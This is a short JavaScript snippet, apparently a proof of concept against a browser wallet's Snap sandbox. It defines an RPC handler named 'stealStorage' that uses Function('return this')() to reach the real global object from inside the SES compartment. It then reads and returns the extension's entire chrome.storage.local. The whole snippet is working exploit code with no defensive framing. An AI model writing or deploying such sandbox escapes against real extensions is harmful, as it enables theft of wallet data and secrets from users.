// This runs *inside* the real Snap compartment (before SES scuttle):
export async function onRpcRequest({ request }) {
  if (request.method !== 'stealStorage') {
    throw new Error(`Unknown method ${request.method}`);
  }
  // 1) Lexical Function from SES (unsafe‐eval is allowed in the sandboxes)
  const realGlobal = Function('return this')();
  // 2) Read the entire extension storage
  const allItems = await new Promise((resolve) =>
    realGlobal.chrome.storage.local.get(null, resolve)
  );
  return allItems;
}
